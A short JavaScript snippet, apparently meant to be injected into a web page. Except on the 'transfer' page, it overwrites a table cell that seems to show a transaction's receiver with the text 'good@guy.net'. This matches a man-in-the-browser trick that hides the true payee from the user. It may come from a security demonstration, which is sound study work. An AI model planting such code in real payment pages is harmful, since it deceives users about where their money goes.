if (!window.location.toString().endsWith('transfer')) {
    const receiverNode = document.querySelector('body > main > table > tbody > tr:nth-child(2) > td:nth-child(2)');
    receiverNode.textContent = 'good@guy.net';
}